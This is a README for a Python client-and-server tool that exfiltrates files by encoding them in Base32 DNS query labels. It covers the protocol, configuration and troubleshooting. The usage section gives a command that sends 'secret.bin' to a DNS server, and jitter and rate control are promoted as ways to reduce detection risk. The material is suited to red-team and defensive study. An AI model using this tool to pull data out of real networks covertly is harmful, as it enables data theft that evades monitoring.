## DNS Exfiltration Tool

A Python-based DNS exfiltration tool consisting of a **client** and **server**.
It sends arbitrary file data over DNS queries and reconstructs it on the server
side, which is useful in environments where traditional network communication
methods are restricted.

### Features

- **Client**:
  - Reads arbitrary binary files and Base32-encodes them (no padding).
  - Splits data into DNS-safe chunks (40-50 characters per chunk).
  - Generates unique session IDs for each transfer.
  - Calculates checksums for each chunk to detect corruption.
  - Sends chunks as `A` queries with the format `<session>-<seq>-<chunk>-<checksum>.<domain>`.
  - Adaptive rate limiting with exponential backoff and jitter.
  - Retry logic for failed chunks.
  - File and console logging via a central logger.

- **Server**:
  - Listens for DNS queries and extracts Base32 chunks from the leading label.
  - Validates checksums before accepting chunks.
  - Supports multiple concurrent transfers via session IDs.
  - Reconstructs the full Base32 stream per session and decodes it back to bytes.
  - Writes decoded data to files named by session ID (binary-safe).
  - Colored console output for better visibility.

- **Configuration**:
  - Central configuration in `config.py` (chunk limits, total size, rate control, etc.).
  - Logs written to a dedicated `logs` directory.

### Protocol Overview

The client and server use a reliable DNS-based transfer protocol optimized for stability:

#### Label Format
```
<session>-<seq>-<chunk>-<checksum>.domain.com
```

Where:
- **session**: 6-character Base32 session ID (30 bits, ~1B unique sessions)
- **seq**: 4-digit zero-padded sequence number (0000-9999, supports up to 10K chunks)
- **chunk**: 40-48 character Base32-encoded data (no padding)
- **checksum**: 3-character Base32 checksum (15 bits, detects corruption)
- **Total**: Maximum 63 characters (DNS label limit)

#### Encoding: Base32 (No Padding)
- Uses Base32 encoding (A-Z, 2-7) which is more DNS-friendly than Base64
- No padding eliminates issues with chunk boundaries
- Case-insensitive and DNS-safe

#### Transfer Process

1. **Client Side**:
   - Read file bytes
   - Generate unique 6-character Base32 session ID
   - Base32-encode file (strip padding)
   - Split into chunks (40-50 chars each)
   - For each chunk:
     - Calculate CRC16 checksum (encoded as 3-char Base32)
     - Format: `<session>-<seq>-<chunk>-<checksum>`
     - Send DNS query with adaptive rate limiting
     - Retry on failure with exponential backoff

2. **Server Side**:
   - Receive DNS query
   - Parse label: `<session>-<seq>-<chunk>-<checksum>`
   - Validate checksum before accepting chunk
   - Store chunk by session ID and sequence number
   - Reconstruct Base32 string (add padding if needed)
   - Decode Base32 to bytes
   - Write to file named by session ID

#### Reliability Features

- **Session IDs**: Prevent collisions when multiple transfers occur simultaneously
- **Checksums**: Detect and reject corrupted chunks from DNS transmission issues
- **Adaptive Rate Control**: Automatically adjusts query rate based on response times
- **Exponential Backoff**: Reduces load on DNS infrastructure when errors occur
- **Jitter**: Random delay variation reduces detection risk
- **Retry Logic**: Automatically retries failed chunks

Because everything ultimately operates on **bytes** and Base32, both text and
binary files are supported.

### Installation

1. Clone the repository:

```bash
git clone https://github.com/yourusername/DNS-Exfiltration.git
cd DNS-Exfiltration
```

2. Install dependencies:

```bash
pip install -r requirements.txt
```

### Usage

#### 1. Run the server

Start the exfiltration server on the default DNS port:

```bash
python server.py -o output
```

Use a custom port:

```bash
python server.py -o output -p 5353
```

Command line arguments:

- `-o, --output-dir`: Path to the output directory (default: `output`). Files are named by session ID and timestamp (e.g. `ABC123_20250211_143022.bin`).
- `-p, --port`: Server listening port (default: 53).
- `-c, --config`: Path to JSON configuration file.
- `-q, --quiet`: Suppress per-chunk logs; keep errors and "Data written" messages.

#### 2. Run the client

Point the client at your server (for example, running locally on port 5353):

```bash
python client.py \
  -f secret.bin \
  --nameservers 127.0.0.1 \
  -d example.com \
  -p 5353
```

Client arguments:

- `-f, --file`: Path to the file to exfiltrate (required).
- `--nameservers`: Comma-separated list of nameservers. Default is `127.0.0.1`.
- `-d, --domain`: Domain to query data with (must be handled by the server).
- `-p, --port`: DNS server listening port (default: 53).
- `-c, --config`: Optional path to a configuration file (currently uses defaults).

> **Note**: Make sure your test domain (e.g. `example.com`) is configured so that
> queries are sent to the machine running `server.py` (e.g. via your system DNS
> settings, a local resolver, or hosts/DNS server configuration).

Run tests from the project root:

```bash
pytest tests/
```

### Configuration

The tool is configured through `config.py` using the `ServerConfig` dataclass.
Key settings include:

**Basic Settings:**
- `port`: Default DNS port (used by the server if not overridden via CLI).
- `address`: Listen address for the server (default `0.0.0.0`).
- `max_total_size`: Maximum total file size in bytes (default 10 MB).
- `chunk_timeout`: Reserved for chunk timeouts (not yet fully used).
- `log_dir`: Directory for log files.
- `output_dir`: Default directory for output files.
- `require_auth` / `auth_key`: Reserved for optional authentication.

**Base32 Format Settings:**
- `chunk_size`: Base32 chunk size in characters (default: 45, range: 40-50).
- `session_id_length`: Session ID length in Base32 characters (default: 6).
- `checksum_length`: Checksum length in Base32 characters (default: 3).

**Rate Control Settings:**
- `base_rate_limit`: Base queries per minute (default: 75).
- `max_rate_limit`: Maximum queries per minute (default: 150).
- `enable_adaptive_rate`: Enable adaptive rate limiting based on response times (default: True).
- `enable_jitter`: Add random jitter to delays to reduce detection risk (default: True).
- `checksum_algorithm`: Checksum algorithm (default: "crc16").

### Security Considerations

- **Adaptive Rate Limiting**: The client automatically adjusts query rate based on
  DNS response times, preventing overload while maximizing throughput.
- **Exponential Backoff**: Failed queries trigger exponential backoff to reduce
  load on DNS infrastructure.
- **Jitter**: Random delay variation reduces detection risk and prevents
  synchronized query patterns.
- **Checksum Validation**: Server validates checksums before accepting chunks,
  detecting and rejecting corrupted data.
- **Size Limits**: `max_total_size` prevents excessive memory and disk usage.
- **Input Validation**: The server validates session IDs, sequence numbers, and
  Base32 data, handling malformed chunks gracefully without crashing.
- **Session Isolation**: Multiple concurrent transfers are isolated by session ID,
  preventing data corruption from mixed transfers.

### Troubleshooting

- **"Incorrect padding" when decoding Base32**: The server only decodes when the combined chunk length is valid (length mod 8 must be 0, 2, 4, 5, or 7 per RFC 4648). During a transfer you may see this until more chunks arrive or the client sends the DONE message. Ensure the client sends the DONE query after all chunks so the server writes once with the correct total.
- **"Checksum validation failed"**: The chunk was corrupted in transit or reordered. The client will retry failed chunks; check network stability and rate limits.
- **Where to find output**: Output files are named `<session_id>_<timestamp>.bin` in the server output directory. The client logs the session ID at start and at end of a successful transfer (e.g. "Session ID: ABC123. On server, look for output file named ABC123_*.bin ...").

### Logging

Logs are stored in the `logs` directory with timestamps. Both file and console
logging are supported, with colored console output for better readability.

### Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

### License

This project is licensed under the MIT License – see the `LICENSE` file for details.